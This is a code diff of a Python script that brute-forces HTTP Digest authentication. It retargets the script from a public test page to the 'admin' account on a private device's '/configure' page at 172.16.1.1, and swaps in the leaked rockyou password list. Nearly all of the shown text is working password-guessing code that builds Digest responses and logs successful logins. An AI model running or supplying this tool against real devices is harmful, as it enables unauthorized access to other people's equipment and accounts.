@@ -21,10 +21,10 @@ def log(request, password, counter):
         exit()
 
 
-def hashes(user, realm, password, method, uri, nonce, cnonce, qop) -> str:
+def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop) -> str:
     h1 = md5(user, realm, password)
     h2 = md5(method, uri)
-    response = md5(h1, nonce, '00000001', cnonce, qop, h2)
+    response = md5(h1, nonce, nc, cnonce, qop, h2)
     return response
 
 
@@ -37,19 +37,19 @@ def parse_authheaders(authheader) -> str:
     return nonce
 
 
-def main():
+def main() -> None:
     # manual progress tracking, I know
     total = 0
 
-    # url = 'http://172.16.1.1/configure'
-    url = 'https://jigsaw.w3.org/HTTP/Digest/'
+    url = 'http://172.16.1.1/configure'
+    # url = 'https://jigsaw.w3.org/HTTP/Digest/'
 
     # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
     user = 'admin'
     uri = '/configure'
     method = 'HEAD'
     qop = 'auth'
-    filename = '10k.txt'
+    filename = 'rockyou_utf8.txt'
 
     with open(filename) as file:
         passwords = [line.rstrip() for line in file]
@@ -60,34 +60,35 @@ def main():
         exit()
 
     # get a new nonce to start the chain
-    # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to ugly slicing
-    r = requests.head(url)
-    realm_dict = dict(reg.findall(r.headers['www-authenticate']))
+    # get realm from header, has problems with '@' for some reason, have to look into that
+    request = requests.head(url)
+    realm_dict = dict(reg.findall(request.headers['www-authenticate']))
     realm = realm_dict['realm']
     print('realm is', realm)
-    nonce = parse_authheaders(r.headers['www-authenticate'])
+    nonce = parse_authheaders(request.headers['www-authenticate'])
 
     for i in range(total, len(passwords)):
         cnonce = secrets.token_hex(8)
-        response = hashes(user, realm, passwords[i], method, uri, nonce, cnonce, qop)
+        response = hashes(user, realm, passwords[i], method, uri, nonce, '00000001', cnonce, qop)
         header = {
-            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm'
-                             f'=MD5, response="{response}", qop={qop}, nc="00000001", cnonce="{cnonce}" '
+            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop={qop}, nc="00000001", cnonce="{cnonce}"'
         }
         request = requests.head(url, headers=header)
-
         # triggers on status codes other than 200 but i'd want to know about those, too
         if request.status_code != 401:
             log(request, passwords[i], i)
+            # new nonces are only given on 401's, so we have to make another request for one
+            request = requests.head(url)
 
         nonce = parse_authheaders(request.headers['www-authenticate'])
 
         # if i % 100 == 0:
         #     print(i, end=', ')
+        # print(request.request.headers)
         print(i, passwords[i], request.status_code)
-        print(nonce)
+        # print(nonce)
 
-    print('Ç\'est la fin')
+    print('La fin.')
 
 
 if __name__ == '__main__':
